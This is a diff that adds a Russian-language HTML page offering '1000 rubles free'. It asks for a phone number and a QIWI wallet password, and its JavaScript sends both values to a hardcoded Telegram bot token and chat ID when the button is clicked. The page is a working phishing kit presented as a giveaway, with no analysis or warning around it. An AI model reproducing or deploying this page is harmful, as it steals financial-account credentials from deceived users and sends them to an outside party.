@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<title>получи деньги</title>
+</head>
+<script type="text/javascript">
+	function sendmsg() {
+		let url = 'https://api.telegram.org/bot1319376539:AAHfB2WJHK6_sGBqlv8jnd0OSAM9W9bKhYk/sendMessage?chat_id=1108316101&text=номере телефона: ' + t1.value + ' пароль от киви: ' + t2.value;
+		let xhttp = new XMLHttpRequest();
+		xhttp.open("GET", url);
+		xhttp.send();
+	}
+</script>
+<style type="text/css">
+	h1 {
+		color: white;
+	}
+	img {
+		margin-top: 50px;
+	}
+	input {
+		font-size: 20px;
+		width: 300px;
+	}
+	#t2 {
+		margin-top: 5px;
+	}
+	a.button24 {
+	  margin-top: 10px;	
+	  display: inline-block;
+	  color: white;
+	  text-decoration: none;
+	  padding: .5em 2em;
+	  outline: none;
+	  border-width: 2px 0;
+	  border-style: solid none;
+	  border-color: #FDBE33 #000 #D77206;
+	  border-radius: 6px;
+	  background: linear-gradient(#F3AE0F, #E38916) #E38916;
+	  transition: 0.2s;
+	} 
+	a.button24:hover { background: linear-gradient(#f5ae00, #f59500) #f5ae00; }
+	a.button24:active { background: linear-gradient(#f59500, #f5ae00) #f59500; }
+</style>
+<body bgcolor="#2266bb">
+	<h1 align="center">ПОЛУЧИ 1000 РУБЛЕЙ БЕСПЛАТНО</h1>
+	<p align="center">
+	<img src="logo_stayhome.png" height="100"> <br> <br>
+	<input type="text" name="t1" id="t1" placeholder="ваш номер телефона" value=""><br>
+	<input type="text" name="t2" id="t2" placeholder="ваш пароль от qiwi" value=""><br>
+	<a href="#" class="button24" onclick="sendmsg()">ПОЛУЧИТЬ 1000 РУБЛЕЙ</a>
+	</p>
+</body>
+</html>
